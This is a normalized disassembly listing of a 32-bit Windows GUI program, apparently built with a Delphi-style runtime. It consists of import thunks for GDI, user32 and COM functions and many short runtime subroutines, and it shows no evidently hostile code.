jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LPtoDP
jmp [ __import_lookup_table_8(gdi32:LPtoDP) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SetAbortProc
jmp [ __import_lookup_table_8(gdi32:SetAbortProc) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetMapMode
jmp [ SetMapMode@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginPaint
jmp [ BeginPaint@IAT ]
BringWindowToTop
jmp [ BringWindowToTop@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateAcceleratorTableA
jmp [ CreateAcceleratorTableA@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DestroyAcceleratorTable
jmp [ DestroyAcceleratorTable@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetClipboardData
jmp [ __import_lookup_table_9(user32:GetClipboardData) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ GetPropA@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetUpdateRect
jmp [ __import_lookup_table_9(user32:GetUpdateRect) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
ValidateRect
jmp [ __import_lookup_table_9(user32:ValidateRect) ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406c94
call GetTickCount
retn
sub_406c9c
xor eax eax
retn
sub_406ca0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406cb0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406ccc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406ce0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406d18
call sub_406c88
retn
sub_406d20
call sub_406c88
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406efd
jmp sub_403a3c
sub_406f04
pop ebp
retn
sub_406f08
sub [ rw-data ] 0x1
retn
sub_406f35
jmp sub_403a3c
sub_406f3c
pop ebp
retn
sub_406f40
sub [ rw-data ] 0x1
retn
sub_407245
jmp sub_403a3c
sub_40724c
pop ebp
retn
sub_407250
sub [ rw-data ] 0x1
retn
sub_407d0d
add eax 0xffffffd4
jmp sub_40d124
sub_407d15
add eax 0xffffffd4
jmp sub_40cfcc
sub_407d1d
add eax 0xffffffd4
jmp sub_40d068
sub_407d25
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059d4
sub_407d2f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4059fc
sub_407d39
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405a10
sub_40809c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408064
test eax eax
sete al
pop esi
pop ebx
retn
sub_4085d4
call sub_4085b0
retn
sub_40866c
push eax
call CloseHandle
retn
sub_40883c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408850
push esi
mov esi eax
xchg edx eax
call sub_402968
mov eax esi
pop esi
retn
sub_408a3c
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_40276c
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408a50
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408a88
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_40278c
sub_408af0
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_4028c8
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408b14
push ebx
mov ebx eax
mov eax ebx
call sub_404038
pop ebx
retn
sub_408e77
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404038
pop eax
pop ebx
retn
sub_40912f
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40928a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4095e7
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4095e7
sub_4096a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esi
xor ecx ecx
call sub_409530
pop esi
pop ebx
retn
sub_409718
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esi
mov cl 0x1
call sub_409530
pop esi
pop ebx
retn
sub_409d92
jmp sub_403a3c
sub_409d99
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409e8a
jmp sub_403a3c
sub_409e91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a635
jmp sub_403a3c
sub_40a63c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a6c4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a668
pop ebp
retn 0x8
sub_40a809
jmp sub_403a3c
sub_40a810
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40acb3
jmp sub_403a3c
sub_40acba
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b1d3
jmp sub_403a3c
sub_40b1da
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b285
jmp sub_403a3c
sub_40b28c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b32f
jmp sub_403a3c
sub_40b336
pop esi
pop ecx
pop ebp
retn
sub_40b512
jmp sub_403a3c
sub_40b519
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b570
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b7cc
mov eax [ rw-data ]
call sub_403a74
retn
sub_40b86e
jmp sub_403a3c
sub_40b93c
jmp sub_403a3c
sub_40b9ac
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_40329c
sub_40baa8
pop ebx
retn
sub_40bb48
jmp sub_403a3c
sub_40bb4f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb58
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a74
sub_40bb65
retn
sub_40bb68
push ebp
mov ebp esp
call sub_40baac
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bb58
pop ebp
retn 0x4
sub_40bb84
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
retn
sub_40bc1c
push ebx
mov ebx eax
mov eax ebx
call sub_40bb9c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bdef
jmp sub_403a3c
sub_40bdf6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bebb
jmp sub_403a3c
sub_40bec2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40becc
call sub_40b704
mov eax 0x1
call sub_404020
sub_40c050
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c129
jmp sub_403a3c
sub_40c146
jmp sub_403a3c
sub_40c14d
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1f8
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c15c
mov ecx eax
sub_40c3e4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c404
push eax
call CharNextA
retn
sub_40c6b4
jmp sub_403a3c
sub_40c6bb
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c724
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40cb7b
jmp sub_403a3c
sub_40cb82
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40ccc0
jmp sub_403a3c
sub_40ccc7
pop ebx
mov esp ebp
pop ebp
retn
sub_40cccc
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cc30
sub_40ccdc
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40ccf8
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_40278c
pop ebx
retn
sub_40cd80
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cd8c
xchg [ eax ] edx
mov eax edx
retn
sub_40cdec
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ce7c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cf94
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cfbc
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d237
jmp sub_403a3c
sub_40d23e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d2ac
jmp sub_403a3c
sub_40d2b3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2d1
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d2ca
jmp sub_403a3c
sub_40d2d1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d721
jmp sub_403a3c
sub_40d728
pop ebp
retn
sub_40d794
jmp sub_403a3c
sub_40d79b
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d814
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d87a
jmp sub_403a3c
sub_40d881
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8e6
jmp sub_403a3c
sub_40d8ed
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d952
jmp sub_403a3c
sub_40d959
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d9be
jmp sub_403a3c
sub_40d9c5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da2a
jmp sub_403a3c
sub_40da31
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40daa9
jmp sub_403a3c
sub_40dab0
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40db1c
jmp sub_403a3c
sub_40db23
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40db8c
jmp sub_403a3c
sub_40db93
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dc00
jmp sub_403a3c
sub_40dc07
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40df8d
jmp sub_403a3c
sub_40df94
pop ebp
retn
sub_40df98
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dc5c
sub_40dfa9
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e5ca
jmp sub_403a3c
sub_40e5d1
pop ecx
pop ebp
retn
sub_40e663
jmp sub_403a3c
sub_40e66a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6ba
jmp sub_403a3c
sub_40e6c1
pop ecx
pop ebp
retn
sub_40e753
jmp sub_403a3c
sub_40e75a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e7aa
jmp sub_403a3c
sub_40e7b1
pop ecx
pop ebp
retn
sub_40e9f9
jmp sub_403a3c
sub_40ea00
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb16
jmp sub_403a3c
sub_40eb1d
pop ecx
pop ebp
retn
sub_40eb20
push ebx
mov ebx eax
mov eax ebx
call sub_40edb8
mov [ ebx ] 0x1
pop ebx
retn
sub_40edb8
test [ eax ] 0xbfe8
jne r-xdata
call sub_40ed3c
retn
mov [ eax ] 0x0
retn
sub_40edcc
push eax
call sub_40edb8
pop eax
retn
sub_40f02c
call sub_40f0e0
retn
sub_40f180
jmp sub_403a3c
sub_40f187
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f1ce
jmp sub_403a3c
sub_40f1d5
pop ebx
pop ecx
pop ebp
retn
sub_40f21a
jmp sub_403a3c
sub_40f221
pop ebx
pop ecx
pop ebp
retn
sub_40f266
jmp sub_403a3c
sub_40f26d
pop ebx
pop ecx
pop ebp
retn
sub_40f2b2
jmp sub_403a3c
sub_40f2b9
pop ebx
pop ecx
pop ebp
retn
sub_40f67b
jmp sub_403a3c
sub_40f682
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f71c
jmp sub_403a3c
sub_40f723
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb91
jmp sub_403788
sub_40fc4c
jmp sub_403788
sub_40fcf3
jmp sub_403788
sub_40fdec
jmp sub_403788
sub_40fec5
jmp sub_403788
sub_40ffad
jmp sub_403788
sub_41016a
jmp sub_403a3c
sub_410171
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4101d3
jmp sub_403a3c
sub_4101da
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410640
jmp sub_403788
sub_41072f
jmp sub_403a3c
sub_410736
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4107d4
jmp sub_403a3c
sub_4107db
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c2d
jmp sub_403a3c
sub_410c34
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410cdd
jmp sub_403a3c
sub_410ce4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411219
jmp sub_403788
sub_411320
jmp sub_403a3c
sub_411327
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411431
jmp sub_403a3c
sub_411438
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411888
jmp sub_403a3c
sub_41188f
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411999
jmp sub_403a3c
sub_4119a0
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411ee6
jmp sub_403a3c
sub_411eed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f91
jmp sub_403a3c
sub_411f98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411fba
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404730
retn
sub_411fb3
jmp sub_403a3c
sub_411fba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412016
jmp sub_403a3c
sub_41201d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412099
jmp sub_403a3c
sub_4125df
jmp sub_403a3c
sub_4125e6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412679
jmp sub_403a3c
sub_412680
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41269d
lea eax [ ebp - 0x14 ]
call sub_404718
retn
sub_412696
jmp sub_403a3c
sub_41269d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126fa
jmp sub_403a3c
sub_412701
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4127a3
jmp sub_403a3c
sub_4127c0
jmp sub_403a3c
sub_4127c7
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412d22
jmp sub_403a3c
sub_412d29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412d9a
jmp sub_403a3c
sub_412da1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41312c
push eax
call sub_40edb8
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413140
push eax
call sub_40edb8
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413253
jmp sub_403a3c
sub_41325a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4132b6
jmp sub_403a3c
sub_4132bd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4132c4
call sub_4132cc
retn
sub_41341c
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f0e0
add esp 0x10
sub_4136c6
jmp sub_403a3c
sub_4136cd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40edb8
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413728
mov edx 0x80020004
call sub_413710
retn
sub_4137b9
jmp sub_403a3c
sub_4137c0
pop esi
pop ebx
pop ebp
retn
sub_4137c4
push ebp
mov ebp esp
call sub_413984
pop ebp
retn 0x4
sub_413850
push ebp
mov ebp esp
call sub_413984
pop ebp
retn 0x4
sub_413933
jmp sub_403a3c
sub_41393a
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4032d8
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
sub_41395c
xor eax eax
retn
sub_413960
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_413974
mov [ ecx ] 0x8
mov al 0x1
retn
sub_41397c
call sub_40e580
retn
sub_413984
call sub_40e670
retn
sub_41398c
call sub_40eacc
retn
sub_413994
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4139a8
call sub_413984
retn
sub_4139b0
push ebp
mov ebp esp
call sub_41398c
pop ebp
retn 0x8
sub_4139c8
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_413aa4
jmp sub_403a3c
sub_413b6d
jmp sub_403a3c
sub_413b74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413b91
lea eax [ ebp - 0x10 ]
call sub_404038
retn
sub_413b8a
jmp sub_403a3c
sub_413b91
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413b9c
call sub_40eb20
retn
sub_413c13
jmp sub_403a3c
sub_413c1a
pop ebp
retn
sub_413cbd
jmp sub_403a3c
sub_413cc4
pop ebp
retn
sub_413dd5
jmp sub_403a3c
sub_413ddc
pop ebp
retn
sub_413de0
sub [ rw-data ] 0x1
retn
sub_413e14
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_414098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
sub_414134
jmp sub_403a3c
sub_41413b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414236
jmp sub_403a3c
sub_41423d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41443c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f0e0
pop esi
pop ebx
retn
sub_4145be
jmp sub_403a3c
sub_4145c5
pop ebp
retn
sub_4145c8
sub [ rw-data ] 0x1
retn
sub_41489f
jmp [ eax + ecx * 2 + 0xb0f0041 ]
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoGetClassObject
jmp [ CoGetClassObject@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ ProgIDFromCLSID@IAT ]
CoTaskMemAlloc
jmp [ CoTaskMemAlloc@IAT ]
